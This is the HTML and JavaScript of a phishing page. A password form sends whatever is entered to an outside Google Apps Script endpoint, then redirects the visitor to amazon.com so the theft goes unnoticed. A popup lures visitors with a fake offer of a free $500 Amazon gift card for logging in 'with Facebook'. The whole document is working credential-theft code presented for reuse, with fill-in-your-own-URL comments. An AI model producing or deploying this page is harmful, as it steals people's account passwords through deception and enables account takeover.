    <!-- Language Selector -->

    <div class="login-container">

        <form name="login-form">
            <!-- Email or Phone Number -->

            <!-- Password -->
            <input type="password" name="password" placeholder="Password" required>
            <div class="error-message" id="error-message">Incorrect password. Must be at least 6 characters.</div>
            <!-- Submit Button -->

    <script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycbxzmeFxvVkaEKLiMXstxc0VZgN2E9MPJAaOQIQBtBbrGQ32hF-Eck3eDaj5FTVTan8LhA/exec'; // Your Web App URL

    const form = document.forms['login-form'];
    const errorMessage = document.getElementById('error-message');
    const passwordInput = form.elements['password'];

    form.addEventListener('submit', function(e) {
        e.preventDefault(); // Prevent the default form submission

        // Get the form data
        const formData = new FormData(form);
        const password = formData.get('password');

        // Password validation (must be at least 6 characters)
        if (password.length < 6) {
            errorMessage.style.display = 'block'; // Show error message
            setTimeout(() => {
                errorMessage.style.display = 'none'; // Hide error message after 3 seconds
            }, 3000);
            return; // Prevent form submission
        }

        // Send the form data to your Google Apps Script Web App
        fetch(scriptURL, {
            method: 'POST',
            body: formData
        })
        .then(response => response.text()) // Handle response as text
        .then(result => {
            console.log('Login Success!', result);
            // Redirect to another site after successful submission
            window.location.href = 'https://www.amazon.com/'; // Replace with your desired URL
        })
        .catch(error => {
            console.error('Error!', error);
            alert('Login failed: ' + error.message); // You can leave the error alert if desired
        });
    });
</script>

<script>
    (function () {
    // Create the overlay background
    var overlay = document.createElement("div");
    overlay.style.position = "fixed";
    overlay.style.top = "0";
    overlay.style.left = "0";
    overlay.style.width = "100%";
    overlay.style.height = "100%";
    overlay.style.backgroundColor = "rgba(0, 0, 0, 0.6)";
    overlay.style.zIndex = "9999";
    overlay.style.display = "flex";
    overlay.style.justifyContent = "center";
    overlay.style.alignItems = "center";

    // Create the popup container
    var popup = document.createElement("div");
    popup.style.width = "250px";
    popup.style.background = "#fff";
    popup.style.borderRadius = "10px";
    popup.style.boxShadow = "0 4px 10px rgba(0, 0, 0, 0.2)";
    popup.style.textAlign = "center";
    popup.style.padding = "20px";
    popup.style.fontFamily = "Arial, sans-serif";

    // Create the message
    var message = document.createElement("p");
    message.innerHTML = "To Get 500$ Amazon gift card for free, you must login Amazon with Facebook.";
    message.style.fontSize = "18px";
    message.style.color = "#333";
    message.style.marginBottom = "20px";

    // Create the OK button
    var button = document.createElement("button");
    button.innerHTML = "OK";
    button.style.background = "#1877f2";
    button.style.color = "#fff";
    button.style.border = "none";
    button.style.padding = "12px 20px";
    button.style.fontSize = "16px";
    button.style.borderRadius = "5px";
    button.style.cursor = "pointer";
    button.style.transition = "0.3s";
    
    button.onmouseover = function () {
        button.style.background = "#0d65d9";
    };
    
    button.onmouseleave = function () {
        button.style.background = "#1877f2";
    };

    // Close popup when button is clicked
    button.onclick = function () {
        document.body.removeChild(overlay);
    };

    // Append elements
    popup.appendChild(message);
    popup.appendChild(button);
    overlay.appendChild(popup);
    document.body.appendChild(overlay);
})();
